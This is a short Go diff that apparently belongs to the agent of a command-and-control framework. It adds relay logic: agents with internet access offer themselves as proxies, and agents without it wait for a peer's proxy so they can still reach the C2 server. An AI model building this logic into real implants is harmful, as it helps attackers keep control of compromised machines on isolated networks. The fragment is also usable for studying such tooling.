@@ -1,6 +1,7 @@
 package main
 
 import (
+	"context"
 	"flag"
 	"fmt"
 	"io/ioutil"
@@ -70,6 +71,25 @@ func main() {
 			log.Fatal(err)
 		}
 		os.Exit(0)
+	}
+
+	// do we have internet?
+	if tun.HasInternetAccess() {
+		// if we do, we are feeling helpful
+		ctx, cancel := context.WithCancel(context.Background())
+		go agent.StartBroadcast(ctx, cancel)
+	} else {
+		// we don't, just wait for some other agents to help us
+		log.Println("[-] We don't have internet access, waiting for other agents to give us a proxy...")
+		ctx, cancel := context.WithCancel(context.Background())
+		go agent.BroadcastServer(ctx, cancel)
+		for ctx.Err() == nil {
+			if agent.AgentProxy != "" {
+				agent.HTTPClient = tun.EmpHTTPClient(agent.AgentProxy)
+				log.Printf("[+] We got a proxy: %s", agent.AgentProxy)
+				break
+			}
+		}
 	}
 
 	// parse C2 address
